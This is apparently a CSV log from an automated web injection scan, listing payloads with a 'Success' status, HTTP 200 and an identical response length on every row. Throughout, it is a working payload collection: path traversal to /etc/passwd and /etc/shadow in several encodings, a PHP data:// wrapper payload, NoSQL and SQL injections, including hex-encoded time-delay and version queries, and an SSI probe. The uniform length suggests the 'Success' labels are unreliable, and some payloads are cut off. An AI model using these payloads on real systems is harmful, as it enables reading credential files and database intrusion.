Status,Payload,HTTP Status,Content Length
Success,../../../../../../../../../../etc/passwd%00,200,10701
Success,../../../../../../../../../../../etc/passwd,200,10701
Success,../../../../../../../../../../../etc/passwd%00,200,10701
Success,../../../../../../../../etc/passwd,200,10701
Success,../../../../../../../../etc/passwd%25%30%30,200,10701
Success,../../../../../../../../../etc/passwd,200,10701
Success,../../../../../../../../../etc/passwd%25%30%30,200,10701
Success,../../../../../../../../../../etc/passwd,200,10701
Success,../../../../../../../../../../etc/passwd%25%30%30,200,10701
Success,../../../../../../../../../../../etc/passwd,200,10701
Success,../../../../../../../../../../../etc/passwd%25%30%30,200,10701
Success,../../../../../../../etc/shadow,200,10701
Success,../../../../../../../etc/shadow%25%30%30,200,10701
Success,../../../../../../../../etc/shadow,200,10701
Success,../../../../../../../../etc/shadow%25%30%30,200,10701
Success,../../../../../../../../../etc/shadow,200,10701
Success,../../../../../../../../../etc/shadow%25%30%30,200,10701
Success,../../../../../../../../../../etc/shadow,200,10701
Success,../../../../../../../../../../etc/shadow%25%30%30,200,10701
Success,../../../../../../../../../../../etc/shadow,200,10701
Success,../../../../../../../../../../../etc/shadow%25%30%30,200,10701
Success,%2Fetc%2Fpasswd,200,10701
Success,%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
Success,%2Fetc%2Fshadow,200,10701
Success,%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
Success,%2Fetc%2Fpasswd,200,10701
Success,%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%25%30%30,200,10701
Success,%2Fetc%2Fshadow,200,10701
Success,%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow%25%30%30,200,10701
Success,%252E%252Findex,200,10701
Success,%252E%252Findex%252Ephp,200,10701
Success,%252E%252Findex%252Ephp%00,200,10701
Success,%252E%252E%252Findex,200,10701
Success,%252E%252E%252Findex%252Ephp,200,10701
Success,%252E%252E%252Findex%252Ephp%00,200,10701
Success,%252E%252E%252F%252E%252E%252Findex,200,10701
Success,%252E%252E%252F%252E%252E%252Findex%252Ephp,200,10701
Success,%252E%252E%252F%252E%252E%252Findex%252Ephp%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Findex,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Findex%252Ephp,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Findex%252Ephp%00,200,10701
Success,%252Fetc%252Fpasswd,200,10701
Success,%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd%00,200,10701
Success,%252Fetc%252Fshadow,200,10701
Success,%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow,200,10701
Success,%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fshadow%00,200,10701
Success,"data://text/plain;base64,PD9waHANCiRob21lcGFnZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdpbmRleC5waHAnKTsNCmVjaG8gJGhvbWVwYWdlOw0KPz4=",200,10701
Success,"data%3A%2F%2Ftext%2Fplain;base64,PD9waHANCiRob21lcGFnZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdpbmRleC5waHAnKTsNCmVjaG8gJGhvbWVwYWdlOw0KPz4=",200,10701
Success,"data%253A%252F%252Ftext%252Fplain;base64,PD9waHANCiRob21lcGFnZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdpbmRleC5waHAnKTsNCmVjaG8gJGhvbWVwYWdlOw0KPz4=true, $where: '1 == 1'",200,10701
Success,", $where: '1 == 1'",200,10701
Success,$where: '1 == 1',200,10701
Success,"', $where: '1 == 1'",200,10701
Success,"1, $where: '1 == 1'",200,10701
Success,{ $ne: 1 },200,10701
Success,"', $or: [ {}, { 'a':'a",200,10701
Success,"' } ], $comment:'successful MongoDB injection'",200,10701
Success,db.injection.insert({success:1});,200,10701
Success,|| 1==1,200,10701
Success,' && this.password.match(/.*/)//+%00,200,10701
Success,' && this.passwordzz.match(/.*/)//+%00,200,10701
Success,'%20%26%26%20this.password.match(/.*/)//+%00,200,10701
Success,'%20%26%26%20this.passwordzz.match(/.*/)//+%00,200,10701
Success,{$gt: ''},200,10701
Success,[$ne]=1,200,10701
Success,';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,200,10701
Success,%20or%201=1,200,10701
Success,; execute immediate 'sel' || 'ect us' || 'er',200,10701
Success,declare @q nvarchar (200) 0x730065006c00650063 ...,200,10701
Success, or 0=0 #,200,10701
Success,inser,200,10701
Success,; exec xp_regread,200,10701
Success,@var select @var as var into temp end --,200,10701
Success,# from wapiti,200,10701
Success, or 0=0 --,200,10701
Success, or 'a'='a,200,10701
Success,or a = a,200,10701
Success, UNION ALL SELECT,200,10701
Success, or 1=1,200,10701
Success, or 2 > 1,200,10701
Success,PRINT,200,10701
Success, or 3=3,200,10701
Success,or%201=1,200,10701
Success,or 1=1,200,10701
Success, or '7659'='7659,200,10701
Success, or 'text' = n'text',200,10701
Success, or 1=1 or ''=',200,10701
Success,declare @s varchar (200) select @s = 0x73656c6 ...,200,10701
Success,exec xp,200,10701
Success,3.10E+17,200,10701
Success,admin' or ',200,10701
Success, or 'unusual' = 'unusual',200,10701
Success,truncate,200,10701
Success,declare @s varchar(200) select @s = 0x77616974 ...,200,10701
Success,or%201=1 --,200,10701
Success,or a=a,200,10701
Success,(sqlvuln),200,10701
Success, or 1=1--,200,10701
Success,0x770061006900740066006F0072002000640065006C00 ...,200,10701
Success,%20'sleep%2050',200,10701
Success,/**/or/**/1/**/=/**/1,200,10701
Success,(sqlattempt2),200,10701
Success, or (EXISTS),200,10701
Success,%20$(sleep%2050),200,10701
Success,%20or%20''=',200,10701
Success,; begin declare @var varchar(8000) set @var=' ...,200,10701
Success,0x77616974666F722064656C61792027303A303A313027 ...,200,10701
Success,exec(@s),200,10701
Success, union select,200,10701
Success,declare @s varchar(22) select @s =,200,10701
Success, or 2 between 1 and 3,200,10701
Success, or a=a--,200,10701
Success, or '1'='1,200,10701
Success, or 1 --',200,10701
Success,"or 0=0 #""",200,10701
Success,declare @s varchar (8000) select @s = 0x73656c ...,200,10701
Success,char%4039%41%2b%40SELECT,200,10701
Success, or username like char(37);,200,10701
Success, or 'text' > 't',200,10701
Success, (select top 1,200,10701
Success, or ''=',200,10701
Success,%20or%20x=x,200,10701
Success,0x730065006c0065006300740020004000400076006500 ...,200,10701
Success,%20or%20'x'='x,200,10701
Success, or 'something' = 'some'+'thing',200,10701
Success,) or (a=a,200,10701
Success,uni/**/on sel/**/ect,200,10701
Success,&apos;%20OR,200,10701
Success,declare @q nvarchar (200) select @q = 0x770061 ...,200,10701
Success,; exec ('sel' + 'ect us' + 'er'),200,10701
Success,declare @q nvarchar (4000) select @q =,200,10701
Success,or 0=0 --,200,10701
Success,or 0=0 #,200,10701
Success, select name from syscolumns where id = (sele ...,200,10701
Success,hi or a=a,200,10701
Success,password:*/=1--,200,10701
Success, UNION SELECT,200,10701
Success, or 1=1 /*,200,10701
Success,"or 1=1 or """"=",200,10701
Success,sqlvuln;,200,10701
Success,28%,200,10701
Success,@variable,200,10701
Success, or '1'='1'--,200,10701
Success, or 1/*,200,10701
Success, or a = a,200,10701
Success,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),200,10701
Success,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) ,200,10701
Success,declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),200,10701
Success,declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),200,10701
Success," or 0=0 #""",200,10701
Success,or 1=1--,200,10701
Success," or 1=1 or """"=",200,10701
Success, or a=a,200,10701
Success,' or (EXISTS),200,10701
Success,' (select top 1,200,10701
Success,"<>""'%;)(&+",200,10701
Success,'sqlattempt1,200,10701
Success,'=',200,10701
Success,or 1=1#,200,10701
Success,/*!UNION*/,200,10701
Success,/*!SELECT*/,200,10701
Success,union%a0select,200,10701
Success,/*!50000UNION*/,200,10701
Success,/*!50000SELECT*/,200,10701
Success,from Information_schema.tables+where+table_schema=database()--+-,200,10701
Success,+from+Information_schema/**/.tables+where+table_schema=database()--+-,200,10701
Success,"<pre><!--#echo var=""DATE_LOCAL"" --> </pre>",200,10701
